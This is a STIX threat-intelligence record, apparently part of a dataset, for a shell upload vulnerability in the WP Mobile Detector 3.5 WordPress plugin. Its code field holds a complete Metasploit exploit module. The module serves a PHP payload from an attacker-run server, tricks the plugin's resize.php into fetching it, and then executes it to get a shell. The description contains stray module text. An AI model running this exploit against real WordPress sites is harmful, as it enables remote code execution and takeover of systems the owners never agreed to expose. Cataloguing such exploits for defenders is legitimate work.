{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9eff5f40-60a2-4a42-860b-ef421043bcae",
    "created": "2024-08-14T17:13:16.818901Z",
    "modified": "2024-08-14T17:13:16.818905Z",
    "name": "WordPress WP Mobile Detector 3.5 Shell Upload",
    "description": " WP Mobile Detector Plugin for WordPress contains a flaw that allows a remote attacker to execute arbitrary PHP code. This flaw exists because the /wp-content/plugins/wp-mobile-detector/resize.php script does contains a remote file include for files not cached by the system already. By uploading a .php file, the remote system will place the file in a user-accessible path. Making a direct request to the uploaded file will allow the attacker to execute the script with the privileges of the web server.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_mobile_detector_upload_execute.rb",
            "external_id": "wp_mobile_detector_upload_execute.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "8505"
        },
        {
            "source_name": "reference",
            "url": "https://www.pluginvulnerabilities.com/2016/05/31/aribitrary-file-upload-vulnerability-in-wp-mobile-detector/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress WP Mobile Detector 3.5 Shell Upload',\n      'Description'     => %q{\n          WP Mobile Detector Plugin for WordPress contains a flaw that allows a remote attacker\n          to execute arbitrary PHP code. This flaw exists because the\n          /wp-content/plugins/wp-mobile-detector/resize.php script does contains a\n          remote file include for files not cached by the system already.\n          By uploading a .php file, the remote system will\n          place the file in a user-accessible path. Making a direct request to the\n          uploaded file will allow the attacker to execute the script with the privileges\n          of the web server.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'pluginvulnerabilities.com', # Vulnerability disclosure\n          'Aaditya Purani', # EDB module discovered after writing module\n          'h00die' # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['WPVDB', '8505'],\n          ['EDB', '39891'],\n          ['URL', 'https://www.pluginvulnerabilities.com/2016/05/31/aribitrary-file-upload-vulnerability-in-wp-mobile-detector/']\n        ],\n      'DisclosureDate'  => '2016-05-31',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['wp-mobile-detectory < 3.6', {}]],\n      'DefaultTarget'   => 0,\n      'Stance'          => Msf::Exploit::Stance::Aggressive\n    ))\n  end\n\n  def check\n    check_plugin_version_from_readme('wp-mobile-detector', '3.5')\n  end\n\n  def exploit\n    payload_name = rand_text_alphanumeric(10) + '.php'\n\n    # First check to see if the file is written already, if it is cache wont retrieve it from us\n    res = send_request_cgi(\n      'global' => true,\n      'method'  => 'GET',\n      'uri'     => normalize_uri(wordpress_url_plugins, 'wp-mobile-detector', 'cache') + '/'\n    )\n    if res && !res.body.include?(payload_name)\n      vprint_status(\"#{payload_name} verified as not written.\")\n    else\n      fail_with(Failure::BadConfig,\"#{payload_name} already written on system.\")\n    end\n\n    def on_request_uri(cli, _request)\n      print_good('Payload requested on server, sending')\n      send_response(cli, payload.encoded)\n    end\n\n    print_status('Starting Payload Server')\n    start_service('Path' => \"/#{payload_name}\")\n\n    print_status(\"Uploading payload via #{normalize_uri(wordpress_url_plugins, 'wp-mobile-detector', 'resize.php')}?src=#{get_uri}\")\n\n    res = send_request_cgi(\n      'global' => true,\n      'method'  => 'GET',\n      'uri'     => normalize_uri(wordpress_url_plugins, 'wp-mobile-detector', 'resize.php'),\n      'vars_get' => {'src' => get_uri}\n    )\n\n    if res && res.code == 200\n      print_good('Sleeping 5 seconds for payload upload')\n      register_files_for_cleanup(payload_name)\n\n      Rex.sleep(5)\n\n      print_status(\"Executing the payload via #{normalize_uri(wordpress_url_plugins, 'wp-mobile-detector', 'cache', payload_name)}\")\n      send_request_cgi(\n      {\n        'uri'     => normalize_uri(wordpress_url_plugins, 'wp-mobile-detector', 'cache', payload_name),\n      })\n      # wait for callback, without this we exit too fast and miss our shell\n      Rex.sleep(2)\n    else\n      if res.nil?\n        fail_with(Failure::Unreachable, 'No response from the target')\n      else\n        vprint_error(\"HTTP Status: #{res.code}\")\n        vprint_error(\"Server returned: #{res.body}\")\n        fail_with(Failure::UnexpectedReply, 'Failed to upload the payload')\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-05-31",
    "x_mitre_platforms": [
        "php'"
    ]
}